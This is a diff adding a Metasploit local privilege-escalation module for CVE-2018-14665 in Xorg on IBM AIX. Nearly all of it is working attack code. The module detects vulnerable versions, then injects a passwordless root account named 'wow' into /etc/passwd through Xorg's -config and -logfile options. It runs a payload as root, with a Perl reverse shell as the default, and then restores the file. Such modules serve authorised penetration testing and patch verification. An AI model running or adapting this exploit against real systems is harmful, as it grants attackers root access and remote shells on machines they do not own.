@@ -1,0 +1,222 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GreatRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Xorg X11 Server Local Privilege Escalation',
+      'Description'    => %q(
+        WARNING: Successful execution of this module results in /etc/passwd being overwritten.
+
+        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.
+
+        A permission check flaw exists for -modulepath and -logfile options when
+        starting Xorg.  This allows unprivileged users that can start the server
+        the ability to elevate privileges and run arbitrary code under root
+        privileges.
+
+        This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1.
+        Due to permission restrictions of the crontab in AIX, this module does not use cron,
+        and instead overwrites /etc/passwd in order to create a new user with root privileges.
+        All currently logged in users need to be included when /etc/passwd is overwritten,
+        else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user.
+        The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,
+        and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when
+        overwriting /etc/passwd.
+      ),
+      'Author'         =>
+        [
+          'Narendra Shinde', # Discovery and original FreeBSD exploit
+          'Zack Flack <dzflack[at]gmail.com>' # Metasploit module and original AIX exploit
+        ],
+      'License'        => MSF_LICENSE,
+      'DisclosureDate' => 'Oct 25 2018',
+      'Notes'         =>
+        {
+          'SideEffects' => [ CONFIG_CHANGES ]
+        },
+      'References'     =>
+        [
+          ['CVE', '2018-14665'],
+          ['URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html'],
+          ['URL', 'https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc'],
+          ['URL', 'https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl'],
+          ['EDB', '45938']
+        ],
+      'Platform'       => ['unix'],
+      'Arch'           => [ARCH_CMD],
+      'SessionTypes'   => ['shell'],
+      'Payload'        => {
+        'Compat' => {
+          'PayloadType'  => 'cmd',
+          'RequiredCmd'  => 'perl'
+        }
+      },
+      'DefaultOptions' => {
+        'Payload' => 'cmd/unix/reverse_perl'
+      },
+      'Targets'        =>
+        [
+          ['IBM AIX Version 6.1', {}],
+          ['IBM AIX Version 7.1', {}],
+          ['IBM AIX Version 7.2', {}]
+        ],
+      'DefaultTarget'  => 1))
+
+    register_options(
+      [
+        OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+      ]
+    )
+  end
+
+  def check
+    xorg_path = cmd_exec('command -v Xorg')
+    if !xorg_path.include?('Xorg')
+      print_error('Could not find Xorg executable')
+      return Exploit::CheckCode::Safe
+    end
+
+    ksh93_path = cmd_exec('command -v ksh93')
+    if !ksh93_path.include?('ksh')
+      print_error('Could not find Ksh93 executable')
+      return Exploit::CheckCode::Safe
+    end
+
+    if !xorg_vulnerable?
+      print_error('Xorg version is not vulnerable')
+      return Exploit::CheckCode::Safe
+    end
+
+    return Exploit::CheckCode::Appears
+  end
+
+  def exploit
+    status = check
+
+    if status == Exploit::CheckCode::Safe
+      fail_with(Failure::NotVulnerable, '')
+    end
+
+    if !writable?(datastore['WritableDir'])
+      fail_with(Failure::BadConfig, "#{datastore['WritableDir']} is not writable")
+    end
+
+    xorg_path = cmd_exec('command -v Xorg')
+    ksh93_path = cmd_exec('command -v ksh93')
+
+    xorg_payload = generate_xorg_payload(xorg_path, ksh93_path, datastore['WritableDir'])
+    xorg_script_path = "#{datastore['WritableDir']}/wow.ksh"
+    upload_and_chmodx(xorg_script_path, xorg_payload)
+
+    passwd_backup = "#{datastore['WritableDir']}/passwd.backup"
+    print_status("Backing up /etc/passwd to #{passwd_backup}")
+    cmd_exec("cp /etc/passwd #{passwd_backup}")
+    register_file_for_cleanup(passwd_backup)
+
+    print_status("Executing #{xorg_script_path}")
+    cmd_exec(xorg_script_path)
+    print_status('Checking if we are root')
+
+    if root?
+      shell_payload = %(#!#{ksh93_path}
+#{payload.encoded}
+)
+      shell_script_path = "#{datastore['WritableDir']}/wowee.ksh"
+      upload_and_chmodx(shell_script_path, shell_payload)
+
+      print_status('Executing shell payload')
+      cmd_exec("#{ksh93_path} -c \"echo #{shell_script_path} | su - wow &\"")
+
+      print_status('Restoring original /etc/passwd')
+      cmd_exec("su - wow -c \"cp #{passwd_backup} /etc/passwd\"")
+    else
+      fail_with(Failure::PayloadFailed, '')
+    end
+  end
+
+  def generate_xorg_payload(xorg_path, ksh93_path, writabledir)
+    passwd_file = read_file('/etc/passwd')
+    passwd_array = passwd_file.split("\n")
+
+    print_status('Retrieving currently logged in users')
+    users = cmd_exec('who | cut -d\' \' -f1 | sort | uniq')
+    users << "\n"
+    users_array = users.split("\n")
+
+    logged_in_users = ''
+    if !users_array.empty?
+      users_array.each do |user|
+        user << ':'
+        passwd_array.each do |line|
+          if line.index(user) == 0
+            logged_in_users << '\n'
+            logged_in_users << line
+          end
+        end
+      end
+    end
+
+    passwd_data = "$'#{logged_in_users}\\nwow::0:0::/:/usr/bin/ksh\\n#'"
+
+    subdir_count = writabledir.count('/')
+    relative_passwd = '../' * subdir_count + '../../etc/passwd'
+
+    return %(#!#{ksh93_path}
+    #{xorg_path} -config #{passwd_data} -logfile #{relative_passwd} :1 > /dev/null 2>&1
+)
+  end
+
+  def xorg_vulnerable?
+    version = cmd_exec('lslpp -L | grep -i X11.base.rte | awk \'{ print $2 }\'')
+    print_status("Xorg version is #{version}")
+    semantic_version = Gem::Version.new(version)
+
+    vulnerable_versions = [
+      ['6.1.9.0', '6.1.9.100'],
+      ['7.1.4.0', '7.1.4.30'],
+      ['7.1.5.0', '7.1.5.31'],
+      ['7.2.0.0', '7.2.0.1'],
+      ['7.2.1.0', '7.2.1.0'],
+      ['7.2.2.0', '7.2.2.0'],
+      ['7.2.3.0', '7.2.3.15']
+    ]
+
+    vulnerable_versions.each do |version_pair|
+      if semantic_version >= Gem::Version.new(version_pair[0]) &&
+         semantic_version <= Gem::Version.new(version_pair[1])
+        return true
+      end
+    end
+
+    return false
+  end
+
+  def root?
+    id_output = cmd_exec('su - wow -c "id"')
+
+    if id_output.include?('euid=0') || id_output.include?('uid=0')
+      print_good('Got root!')
+      return true
+    end
+
+    print_error('Not root')
+    false
+  end
+
+  def upload_and_chmodx(path, data)
+    print_status("Writing to #{path}")
+    rm_f(path)
+    write_file(path, data)
+    cmd_exec("chmod 0555 '#{path}'")
+
+    register_file_for_cleanup(path)
+  end
+end
